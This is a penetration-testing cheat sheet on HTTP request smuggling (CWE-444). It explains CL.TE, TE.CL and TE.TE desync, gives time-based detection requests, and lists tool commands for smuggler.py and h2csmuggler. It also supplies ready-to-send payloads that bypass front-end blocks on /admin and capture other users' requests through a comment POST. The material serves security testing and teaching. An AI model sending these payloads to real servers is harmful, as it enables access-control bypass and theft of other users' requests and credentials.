# HTTP Request Smuggling

**CWE:** CWE-444 | Severity: High–Critical

---

## Concept

HTTP request smuggling exploits discrepancies between how a **front-end proxy** and **back-end server** parse HTTP request boundaries (`Content-Length` vs `Transfer-Encoding`).

---

## Types

**CL.TE** — Front-end uses `Content-Length`, back-end uses `Transfer-Encoding`

**TE.CL** — Front-end uses `Transfer-Encoding`, back-end uses `Content-Length`

**TE.TE** — Both support `Transfer-Encoding`, but one can be obfuscated to disable it

---

## Detection

```bash
# Burp Suite Scanner — "HTTP Request Smuggling" active scan
# HTTP Request Smuggler extension (Burp)

# Manual CL.TE detection (time-based)
POST / HTTP/1.1
Host: target.com
Content-Length: 6
Transfer-Encoding: chunked

0

X    ← if 10s delay → CL.TE vulnerable

# Manual TE.CL detection (time-based)
POST / HTTP/1.1
Host: target.com
Content-Length: 3
Transfer-Encoding: chunked

1
X
0

     ← if 10s delay → TE.CL vulnerable
```

---

## Exploitation: Bypass Front-End Access Controls

```
# If /admin is blocked by front-end but not back-end:

POST / HTTP/1.1
Host: target.com
Content-Length: 37
Transfer-Encoding: chunked

0

GET /admin HTTP/1.1
X-Ignore: X
```

---

## Exploitation: Capture Other Users' Requests

```
POST / HTTP/1.1
Host: target.com
Content-Length: 129
Transfer-Encoding: chunked

0

POST /post/comment HTTP/1.1
Host: target.com
Content-Length: 400

csrf=token&postId=5&comment=
```

---

## Automated Testing

```bash
# smuggler.py
python3 smuggler.py -u https://target.com

# h2csmuggler (HTTP/2 cleartext)
python3 h2csmuggler.py --test https://target.com
```

---

## Resources

- PortSwigger Web Security Academy — HTTP Request Smuggling labs
- James Kettle — "HTTP Desync Attacks: Request Smuggling Reborn" (BlackHat 2019)
